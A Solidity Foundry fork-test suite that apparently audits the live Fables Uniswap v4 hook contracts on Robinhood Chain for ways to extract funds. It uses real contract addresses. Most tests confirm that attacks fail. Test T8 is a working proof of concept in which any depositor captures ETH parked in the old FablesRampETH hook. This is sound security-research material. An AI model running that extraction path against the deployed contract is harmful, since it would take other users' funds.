// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {
    PoolKey,
    IPoolManager,
    IFablesLedger,
    IAccessManager,
    IERC20,
    IERC6909,
    IUnlockCallback
} from "../src/Interfaces.sol";

/// @title Fables (Robinhood Chain, 4663) Z3-H13 — live extractability probe
/// @notice Read-only fork tests. No mainnet transactions are ever sent; everything runs against a
///         fork created by `vm.createSelectFork`.
contract FablesZ3H13Test is Test {
    address constant PM = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
    address constant RAMP = 0x08E52564Bad99E05a694b4809F397edcA417A080;
    address constant RWA = 0x5Eb87F69bE00Df39981622Fd60A8De4b7837e080;
    address constant RAMPETH = 0x594e8e6281eDf2d363a0293a50004Cf868E7a080;
    address constant OLDRAMPETH = 0x06a889870C8f83640D6816319f72e2aA579b6080;
    address constant AM = 0xA362D98B33A7bb5B5E2180a05f995A70FB404f30;
    address constant SAFE = 0x9F887B9930E9e716286333Bd8e291f64a8710F6f;

    address constant USDG = 0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168; // 6 decimals
    address constant CASHCAT = 0x020bfC650A365f8BB26819deAAbF3E21291018b4; // 18 decimals

    // CASHCAT/USDG pool on FablesRamp (tickSpacing 60)
    PoolKey cashatPool;
    // NATIVE ETH/USDG pool on the OLD FablesRampETH (tickSpacing 10)
    PoolKey oldEthPool;
    // NATIVE ETH/PONS pool on the current FablesRampETH (tickSpacing 60)
    PoolKey newEthPool;

    address attacker = makeAddr("freshAttacker");

    function setUp() public {
        string memory url = _pickRpc();
        vm.createSelectFork(url);
        console2.log("fork block", block.number);

        cashatPool = PoolKey({
            currency0: CASHCAT,
            currency1: USDG,
            fee: 0x800000, // dynamic fee flag
            tickSpacing: 60,
            hooks: RAMP
        });
        oldEthPool = PoolKey({
            currency0: address(0),
            currency1: USDG,
            fee: 0x800000,
            tickSpacing: 10,
            hooks: OLDRAMPETH
        });
        newEthPool = PoolKey({
            currency0: address(0),
            currency1: 0x39dBED3a2bd333467115dE45665cC57F813C4571, // PONS
            fee: 0x800000,
            tickSpacing: 60,
            hooks: RAMPETH
        });
    }

    /* ------------------------------ helpers ------------------------------ */

    /// @dev RHO_RPC override, else probe the keyless endpoints in order via a raw VM call so a
    ///      dead endpoint can be skipped instead of reverting the suite.
    function _pickRpc() internal returns (string memory) {
        string memory override_ = vm.envOr("RHO_RPC", string(""));
        if (bytes(override_).length != 0) return override_;
        string[3] memory urls = [
            "https://rpc.mainnet.chain.robinhood.com",
            "https://robinhood-rpc.publicnode.com",
            "https://robinhood.drpc.org"
        ];
        for (uint256 i = 0; i < 3; i++) {
            (bool ok,) = VM_ADDRESS.call(abi.encodeWithSignature("createSelectFork(string)", urls[i]));
            if (ok) return urls[i];
        }
        revert("no reachable Robinhood Chain (4663) RPC");
    }

    function _poolId(PoolKey memory k) internal pure returns (bytes32) {
        return keccak256(abi.encode(k));
    }

    function _slot0(bytes32 poolId) internal view returns (uint160 sqrtPriceX96, int24 tick) {
        bytes32 slot = keccak256(abi.encodePacked(poolId, bytes32(uint256(6))));
        bytes32 data = IPoolManager(PM).extsload(slot);
        assembly ("memory-safe") {
            sqrtPriceX96 := and(data, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            tick := signextend(2, shr(160, data))
        }
    }

    function _floorSpacing(int24 tick, int24 spacing) internal pure returns (int24) {
        int256 t = int256(tick);
        int256 s = int256(spacing);
        int256 q = t / s;
        if (t < 0 && t % s != 0) q -= 1;
        return int24(q * s);
    }

    function _ceilSpacing(int24 tick, int24 spacing) internal pure returns (int24) {
        int256 t = int256(tick);
        int256 s = int256(spacing);
        int256 q = t / s;
        if (t > 0 && t % s != 0) q += 1;
        return int24(q * s);
    }

    /// @dev A tick range entirely ABOVE the current price: v4 then requires 100% currency0
    ///      (see Pool.modifyLiquidity: `tick < tickLower` -> getAmount0Delta of the full range).
    function _aboveSpotRange(bytes32 poolId, int24 spacing, int24 widthTicks)
        internal
        view
        returns (int24 tickLower, int24 tickUpper)
    {
        (, int24 tick) = _slot0(poolId);
        tickLower = _ceilSpacing(tick + spacing * 2, spacing);
        tickUpper = tickLower + widthTicks;
    }

    /* ---------------------- T1: live state baseline ---------------------- */

    function test_T1_liveState() public {
        assertEq(IFablesLedger(RAMP).distributor(), address(0), "distributor unset");
        assertEq(IFablesLedger(RAMP).claimFeeRecipient(), SAFE, "claim fee sink = Safe");
        assertEq(IFablesLedger(RAMP).ballotGate(), address(0), "ballot gate unset");
        assertEq(IFablesLedger(RAMP).pausedUntil(), 0, "not paused");
        console2.log("RAMP claimFeeOwed[USDG] =", IFablesLedger(RAMP).claimFeeOwed(USDG));
        console2.log("RAMP distributorOwed[USDG] =", IFablesLedger(RAMP).distributorOwed(USDG));
    }

    /* ------------- T2: sweepClaimFee is destination-locked ------------- */

    function test_T2_sweepClaimFee_paysOnlyConfiguredSink() public {
        uint256 pot = IFablesLedger(RAMP).claimFeeOwed(USDG);
        assertGt(pot, 0, "expect a live USDG claim-fee pot on FablesRamp");

        uint256 safeBefore = IERC20(USDG).balanceOf(SAFE);
        uint256 attackerBefore = IERC20(USDG).balanceOf(attacker);
        uint256 hookBefore = IERC20(USDG).balanceOf(RAMP);

        vm.prank(attacker);
        IFablesLedger(RAMP).sweepClaimFee(USDG);

        assertEq(IERC20(USDG).balanceOf(SAFE) - safeBefore, pot, "sink received exactly the pot");
        assertEq(IERC20(USDG).balanceOf(attacker), attackerBefore, "attacker gained nothing");
        assertEq(IFablesLedger(RAMP).claimFeeOwed(USDG), 0, "pot zeroed");
        assertEq(IERC20(USDG).balanceOf(RAMP), hookBefore, "hook token balance untouched");
        console2.log("swept pot (USDG 6dp):", pot);
    }

    function test_T3_sweepDistributor_isNoopWhenDistributorUnset() public {
        assertEq(IFablesLedger(RAMP).distributor(), address(0));
        uint256 safeBefore = IERC20(USDG).balanceOf(SAFE);
        uint256 attackerBefore = IERC20(USDG).balanceOf(attacker);
        vm.prank(attacker);
        IFablesLedger(RAMP).sweepDistributor(USDG); // returns early, no revert
        assertEq(IERC20(USDG).balanceOf(SAFE), safeBefore);
        assertEq(IERC20(USDG).balanceOf(attacker), attackerBefore);
        assertEq(IFablesLedger(RAMP).distributorOwed(USDG), 0);
    }

    /* ------------- T4: restricted admin surface is closed ------------- */

    function test_T4_restrictedFunctions_revertForFreshCaller() public {
        vm.startPrank(attacker);
        vm.expectRevert();
        IFablesLedger(RAMP).pokeFee(_poolId(cashatPool), 100, 100, 3600);
        vm.expectRevert();
        IFablesLedger(RAMP).clearPoke(_poolId(cashatPool));
        vm.expectRevert();
        IFablesLedger(RAMP).setPaused(1 days);
        vm.expectRevert();
        IFablesLedger(RAMP).pause(1 days);
        vm.expectRevert();
        IFablesLedger(RAMP).setPoolPaused(cashatPool, 1 days);
        vm.expectRevert();
        IFablesLedger(RAMP).pausePool(cashatPool, 1 days);
        vm.expectRevert();
        IFablesLedger(RAMP).setBallotGate(attacker);
        address[] memory none = new address[](0);
        vm.expectRevert();
        IFablesLedger(RAMP).setDistributor(none, attacker);
        vm.expectRevert();
        IFablesLedger(RAMP).setClaimFee(cashatPool, none, 100, attacker);
        vm.stopPrank();

        // AccessManager confirms the gate directly
        (bool ok, uint32 delay) = IAccessManager(AM).canCall(attacker, RAMP, bytes4(keccak256("pokeFee(bytes32,uint24,uint24,uint40)")));
        assertFalse(ok, "pokeFee not callable");
        assertEq(delay, 0);
        uint64 role = IAccessManager(AM).getTargetFunctionRole(RAMP, bytes4(keccak256("setPaused(uint256)")));
        assertEq(role, 0, "ADMIN_ROLE");
        (bool admin, ) = IAccessManager(AM).hasRole(0, attacker);
        assertFalse(admin, "fresh attacker is not admin");
    }

    function test_T5_stakeAndSyncRanges_revertWhileGateUnset() public {
        uint256 id = uint256(keccak256(abi.encode(_poolId(cashatPool), int24(-600), int24(600))));
        vm.startPrank(attacker);
        vm.expectRevert();
        IFablesLedger(RAMP).stake(cashatPool, -600, 600, 1, 0);
        uint256[] memory ids = new uint256[](1);
        ids[0] = id;
        vm.expectRevert();
        IFablesLedger(RAMP).syncRanges(1, ids);
        vm.expectRevert();
        IFablesLedger(RAMP).unstake(cashatPool, -600, 600, 0); // zero-share door closed
        vm.stopPrank();
    }

    /* --------- T6: deposit/withdraw round trip is not profitable --------- */

    function test_T6_depositWithdrawRoundTrip_noProfit() public {
        bytes32 pid = _poolId(cashatPool);
        (int24 tl, int24 tu) = _aboveSpotRange(pid, 60, 600);
        // Above spot => position is 100% currency0 (CASHCAT)
        deal(CASHCAT, attacker, 1e24);
        deal(USDG, attacker, 1_000e6);
        vm.startPrank(attacker);
        IERC20(CASHCAT).approve(RAMP, type(uint256).max);
        IERC20(USDG).approve(RAMP, type(uint256).max);
        uint256 c0 = IERC20(CASHCAT).balanceOf(attacker);
        uint256 u0 = IERC20(USDG).balanceOf(attacker);
        IFablesLedger(RAMP).deposit(cashatPool, tl, tu, 1e15, 1e24, 0, block.timestamp + 60);
        uint256 cMid = IERC20(CASHCAT).balanceOf(attacker);
        uint256 uMid = IERC20(USDG).balanceOf(attacker);
        console2.log("paid cashat", c0 - cMid);
        console2.log("paid usdg", u0 - uMid);
        assertLt(cMid, c0, "deposit cost something");
        IFablesLedger(RAMP).withdraw(cashatPool, tl, tu, 1e15, attacker, 0, 0, block.timestamp + 60);
        uint256 c1 = IERC20(CASHCAT).balanceOf(attacker);
        uint256 u1 = IERC20(USDG).balanceOf(attacker);
        vm.stopPrank();
        console2.log("net cashat", int256(c1) - int256(c0));
        console2.log("net usdg", int256(u1) - int256(u0));
        assertLe(c1 + u1, c0 + u0, "round trip cannot create value");
        assertLe(c1, c0, "no free currency0");
    }

    /* --------- T7: donation cannot be recovered by the donor --------- */

    function test_T7_donation_isNotRecoverable() public {
        uint256 amount = 100e6; // 100 USDG
        deal(USDG, attacker, amount);
        Donor donor = new Donor(PM);
        vm.prank(attacker);
        IERC20(USDG).approve(address(donor), amount);
        uint256 before_ = IERC20(USDG).balanceOf(attacker);
        vm.prank(attacker);
        donor.donate(cashatPool, 0, amount);
        assertEq(IERC20(USDG).balanceOf(attacker), before_ - amount, "donation left the attacker");
        // No permissionless path returns it: the attacker has no position, no owed, no pot.
        vm.startPrank(attacker);
        IFablesLedger(RAMP).sweepClaimFee(USDG);
        IFablesLedger(RAMP).sweepDistributor(USDG);
        vm.stopPrank();
        assertEq(IERC20(USDG).balanceOf(attacker), before_ - amount, "donation not recoverable");
    }

    /* ---- T8: OLD FablesRampETH — parked ETH is claimable by any depositor ---- */

    function test_T8_oldRampEth_parkedEth_isFreeForAnyDepositor() public {
        uint256 park = 1 ether;
        vm.deal(OLDRAMPETH, address(OLDRAMPETH).balance + park);
        vm.deal(attacker, 1 ether);
        assertEq(address(OLDRAMPETH).balance, park, "park installed");

        bytes32 pid = _poolId(oldEthPool);
        (int24 tl, int24 tu) = _aboveSpotRange(pid, 10, 600);
        uint256 a0 = attacker.balance;
        // msg.value must be >= amount0Max; the range is below spot so a tiny amount0 is owed.
        vm.prank(attacker);
        IFablesLedger(OLDRAMPETH).deposit{value: 10_000}(oldEthPool, tl, tu, 1, 10_000, 0, block.timestamp + 60);
        int256 gained = int256(attacker.balance) - int256(a0);
        console2.log("attacker ETH gain (wei):", gained);
        console2.log("hook balance after:", address(OLDRAMPETH).balance);
        assertGt(gained, int256(park) - 1e6, "attacker captured the whole park");
    }

    /* ---- T9: CURRENT FablesRampETH — same park is NOT claimable ---- */

    function test_T9_newRampEth_parkedEth_isNotClaimable() public {
        uint256 park = 1 ether;
        vm.deal(RAMPETH, address(RAMPETH).balance + park);
        vm.deal(attacker, 1 ether);
        bytes32 pid = _poolId(newEthPool);
        (int24 tl, int24 tu) = _aboveSpotRange(pid, 60, 600);
        uint256 a0 = attacker.balance;
        vm.prank(attacker);
        IFablesLedger(RAMPETH).deposit{value: 10_000}(newEthPool, tl, tu, 1, 10_000, 0, block.timestamp + 60);
        int256 gained = int256(attacker.balance) - int256(a0);
        console2.log("attacker ETH gain (wei):", gained);
        assertLt(gained, int256(10_000), "delta-bounded refund returns only the caller's own remainder");
        assertGe(address(RAMPETH).balance, park, "park stays in the hook");
    }

    /* --------- T10: claim-fee pots are backed by ERC-6909 claims --------- */

    function test_T10_potsAreBacked() public {
        address[4] memory hooks = [RAMP, RWA, RAMPETH, OLDRAMPETH];
        address[3] memory curs = [USDG, CASHCAT, address(0)];
        for (uint256 i = 0; i < hooks.length; i++) {
            for (uint256 j = 0; j < curs.length; j++) {
                uint256 pot = IFablesLedger(hooks[i]).claimFeeOwed(curs[j]);
                uint256 owed = IFablesLedger(hooks[i]).distributorOwed(curs[j]);
                if (pot == 0 && owed == 0) continue;
                uint256 claims = IPoolManager(PM).balanceOf(hooks[i], uint256(uint160(curs[j])));
                assertGe(claims, pot + owed, "claims back the pots");
            }
        }
    }
}

/// @dev Minimal v4 unlocker used to exercise `donate` (a permissionless accounting ingress).
contract Donor is IUnlockCallback {
    address immutable pm;
    constructor(address _pm) {
        pm = _pm;
    }

    function donate(PoolKey calldata key, uint256 amount0, uint256 amount1) external {
        IPoolManager(pm).unlock(abi.encode(key, amount0, amount1, msg.sender));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == pm, "only pm");
        (PoolKey memory key, uint256 amount0, uint256 amount1, address payer) =
            abi.decode(data, (PoolKey, uint256, uint256, address));
        IPoolManager(pm).donate(key, amount0, amount1, "");
        if (amount0 > 0) {
            IPoolManager(pm).sync(key.currency0);
            IERC20(key.currency0).transferFrom(payer, pm, amount0);
            IPoolManager(pm).settle();
        }
        if (amount1 > 0) {
            IPoolManager(pm).sync(key.currency1);
            IERC20(key.currency1).transferFrom(payer, pm, amount1);
            IPoolManager(pm).settle();
        }
        return "";
    }
}
